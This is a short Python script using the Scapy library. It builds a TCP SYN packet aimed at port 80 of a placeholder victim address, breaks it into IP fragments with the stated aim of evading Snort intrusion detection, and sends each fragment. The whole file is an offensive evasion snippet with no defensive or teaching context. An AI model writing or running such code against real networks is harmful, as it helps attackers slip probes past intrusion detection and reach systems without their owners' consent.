from scapy.all import *

# Define destination IP address (victim's IP)
victim_ip = "victim_ip"

# Create a TCP SYN packet
ip = IP(dst=victim_ip) / TCP(dport=80, flags="S")

# Fragment the IP packet to evade Snort's detection
fragments = fragment(ip)

# Send each fragment
for fragment in fragments:
    send(fragment)
